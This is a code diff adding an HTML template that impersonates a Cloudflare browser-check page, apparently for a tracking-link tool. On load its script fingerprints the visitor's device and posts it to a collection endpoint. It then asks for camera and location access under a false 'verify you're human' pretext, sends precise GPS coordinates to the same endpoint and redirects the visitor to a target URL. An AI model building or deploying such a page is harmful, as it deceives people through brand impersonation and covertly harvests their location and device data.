@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check - Cloudflare</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+        
+        body {
+            background: #f1f5f9;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .cf-container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04);
+            overflow: hidden;
+        }
+        
+        .cf-header {
+            background: #f6821f;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .cf-logo {
+            width: 40px;
+            height: 40px;
+        }
+        
+        .cf-logo svg {
+            width: 100%;
+            height: 100%;
+            fill: white;
+        }
+        
+        .cf-header h1 {
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+        }
+        
+        .cf-content {
+            padding: 30px;
+        }
+        
+        .checking {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .checking h2 {
+            color: #1e293b;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        .checking p {
+            color: #64748b;
+            font-size: 14px;
+        }
+        
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #f6821f;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: #f6821f;
+            transition: width 0.3s;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #f8fafc;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .security-badge .icon {
+            font-size: 24px;
+        }
+        
+        .security-badge .text {
+            color: #475569;
+            font-size: 13px;
+        }
+        
+        .text strong {
+            color: #1e293b;
+        }
+        
+        .permission-request {
+            background: #fff7ed;
+            border-left: 4px solid #f6821f;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        
+        .permission-request h3 {
+            color: #9a3412;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        .permission-request p {
+            color: #7b341e;
+            font-size: 14px;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary {
+            background: #f6821f;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #e67616;
+        }
+        
+        .btn-secondary {
+            background: #e2e8f0;
+            color: #334155;
+        }
+        
+        .btn-secondary:hover {
+            background: #cbd5e1;
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .status {
+            text-align: center;
+            padding: 10px;
+            border-radius: 6px;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        .status.success {
+            background: #d1fae5;
+            color: #065f46;
+        }
+        
+        .status.error {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+        
+        .status.info {
+            background: #dbeafe;
+            color: #1e40af;
+        }
+        
+        .cf-footer {
+            padding: 20px;
+            background: #f8fafc;
+            border-top: 1px solid #e2e8f0;
+            text-align: center;
+            color: #94a3b8;
+            font-size: 12px;
+        }
+        
+        .ray-id {
+            font-family: monospace;
+            background: #f1f5f9;
+            padding: 8px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 12px;
+            color: #475569;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="cf-container">
+        <div class="cf-header">
+            <div class="cf-logo">
+                <svg viewBox="0 0 48 48">
+                    <path d="M24 0C10.745 0 0 10.745 0 24c0 13.255 10.745 24 24 24s24-10.745 24-24c0-13.255-10.745-24-24-24z"/>
+                </svg>
+            </div>
+            <h1>Cloudflare Security Check</h1>
+        </div>
+        
+        <div class="cf-content">
+            <div class="checking">
+                <h2>Checking your browser...</h2>
+                <p>Please wait while we verify your browser compatibility</p>
+            </div>
+            
+            <div class="loader" id="loader"></div>
+            
+            <div class="progress-bar">
+                <div class="progress" id="progress" style="width: 0%"></div>
+            </div>
+            
+            <div class="security-badge">
+                <div class="icon">🔒</div>
+                <div class="text">
+                    <strong>Security Check</strong> - Your connection is being encrypted with TLS 1.3
+                </div>
+            </div>
+            
+            <div class="ray-id">
+                Ray ID: <span id="rayId">CF-<%= Math.random().toString(36).substring(2, 10).toUpperCase() %></span>
+            </div>
+            
+            <div class="permission-request" id="permissionRequest" style="display: none;">
+                <h3>📷 Camera & Location Access Required</h3>
+                <p>To complete the security check, we need access to your camera and location. This helps us verify you're a real person.</p>
+                
+                <div class="btn-group">
+                    <button class="btn btn-primary" id="allowBtn">Allow Access</button>
+                    <button class="btn btn-secondary" id="skipBtn">Skip</button>
+                </div>
+            </div>
+            
+            <div class="status" id="status"></div>
+            
+            <div id="deviceInfo" style="display: none;">
+                <p>Device: <span id="deviceName"></span></p>
+                <p>Browser: <span id="browserName"></span></p>
+                <p>OS: <span id="osName"></span></p>
+                <p>Screen: <span id="screenRes"></span></p>
+                <p>Language: <span id="language"></span></p>
+                <p>Timezone: <span id="timezone"></span></p>
+            </div>
+        </div>
+        
+        <div class="cf-footer">
+            <p>Your IP: <span id="ipAddress">Detecting...</span></p>
+            <p>© 2024 Cloudflare, Inc. All rights reserved.</p>
+        </div>
+    </div>
+    
+    <script>
+        const linkId = '<%= linkId %>';
+        const targetUrl = '<%= targetUrl %>';
+        const rayId = document.getElementById('rayId').textContent;
+        const progress = document.getElementById('progress');
+        const loader = document.getElementById('loader');
+        const permissionRequest = document.getElementById('permissionRequest');
+        const status = document.getElementById('status');
+        const allowBtn = document.getElementById('allowBtn');
+        const skipBtn = document.getElementById('skipBtn');
+        
+        let progressInterval;
+        let progressValue = 0;
+        
+        // Collect device info
+        function collectDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null
+            };
+            
+            return info;
+        }
+        
+        // Send collected data
+        async function sendData(type, data) {
+            try {
+                const response = await fetch('/api/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        linkId: linkId,
+                        type: type,
+                        data: data
+                    })
+                });
+                
+                return response.ok;
+            } catch (err) {
+                console.error('Send data error:', err);
+                return false;
+            }
+        }
+        
+        // Simulate progress
+        function startProgress() {
+            progressInterval = setInterval(() => {
+                if (progressValue < 90) {
+                    progressValue += Math.random() * 10;
+                    progress.style.width = Math.min(progressValue, 90) + '%';
+                }
+            }, 500);
+        }
+        
+        // Complete progress
+        function completeProgress() {
+            clearInterval(progressInterval);
+            progressValue = 100;
+            progress.style.width = '100%';
+            loader.style.display = 'none';
+        }
+        
+        // Get location
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        console.error('Geolocation error:', error);
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Get camera access
+        async function getCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                // Just get access, then stop
+                stream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (err) {
+                console.error('Camera error:', err);
+                return false;
+            }
+        }
+        
+        // Initialize
+        (async () => {
+            startProgress();
+            
+            // Send basic device info
+            const deviceInfo = collectDeviceInfo();
+            await sendData('info', deviceInfo);
+            
+            // Show permission request after 3 seconds
+            setTimeout(() => {
+                permissionRequest.style.display = 'block';
+            }, 3000);
+        })();
+        
+        allowBtn.addEventListener('click', async () => {
+            status.className = 'status info';
+            status.textContent = 'Requesting permissions...';
+            status.style.display = 'block';
+            
+            allowBtn.disabled = true;
+            skipBtn.disabled = true;
+            
+            // Request location
+            const location = await getLocation();
+            if (location) {
+                await sendData('location', location);
+            }
+            
+            // Request camera
+            const cameraGranted = await getCameraAccess();
+            
+            completeProgress();
+            
+            status.className = 'status success';
+            status.textContent = 'Verification complete! Redirecting...';
+            
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 2000);
+        });
+        
+        skipBtn.addEventListener('click', () => {
+            completeProgress();
+            
+            status.className = 'status info';
+            status.textContent = 'Basic verification complete. Redirecting...';
+            status.style.display = 'block';
+            
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 2000);
+        });
+        
+        // Auto-skip after 15 seconds
+        setTimeout(() => {
+            if (permissionRequest.style.display === 'block') {
+                skipBtn.click();
+            }
+        }, 15000);
+    </script>
+</body>
+</html>
